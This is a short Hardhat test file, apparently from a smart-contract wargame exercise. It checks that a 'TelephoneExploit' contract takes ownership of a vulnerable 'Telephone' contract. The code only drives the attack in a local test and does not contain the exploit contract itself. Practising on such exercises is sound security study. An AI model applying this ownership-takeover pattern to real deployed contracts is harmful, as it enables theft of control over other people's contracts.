
import { expect } from "chai";
import { deployments,getNamedAccounts, ethers} from "hardhat";
import "hardhat-deploy-ethers";

describe("TelephoneExploit", async () =>{

  it("Should get ownership", async () =>{
      await deployments.fixture(["Telephone","TelephoneExploit"])
      const {exploiter} = await getNamedAccounts();
      const exploiterAcc = await ethers.getSigner(exploiter);
      const telephoneDeployment=await deployments.get('Telephone')
      const telephoneExploitDeployment=await deployments.get('TelephoneExploit')
      
      const telephone = await ethers.getContractAt('Telephone',telephoneDeployment.address)
      const telephoneExploit = await ethers.getContractAt('TelephoneExploit',telephoneExploitDeployment.address)
      
      expect(await telephone.owner(),"Equal to new owner").to.be.not.equal(exploiter)
      const transaction =await telephoneExploit.connect(exploiterAcc).getOwnership()
      await transaction.wait()
      expect(await telephone.owner(),"Not equal to new owner").to.be.equal(exploiter)
  });
});
